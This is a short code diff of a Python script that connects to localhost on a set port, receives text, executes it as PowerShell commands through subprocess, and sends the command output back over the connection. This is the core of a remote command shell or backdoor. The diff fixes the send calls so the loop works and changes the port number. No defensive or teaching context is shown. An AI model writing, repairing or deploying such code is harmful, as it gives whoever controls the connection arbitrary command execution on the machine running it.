@@ -4,7 +4,7 @@ import subprocess
 
 def main():
   hote = "localhost"
-  port = 4579
+  port = 123
   end = True
   connect = False
   now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
@@ -31,13 +31,13 @@ def main():
       conct.close()
       sys.exit(0)
     now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-    print(now, " : " ,response)
+    print(now, " : ",response)
 
     try:
       result = subprocess.check_output(['powershell.exe', response]).decode()
-      socket.send(result.encode())
+      conct.send(result.encode())
     except:
-      socket.send("error decode...".encode())
+      conct.send("error decode...".encode())
       continue
 
 if __name__ == "__main__":
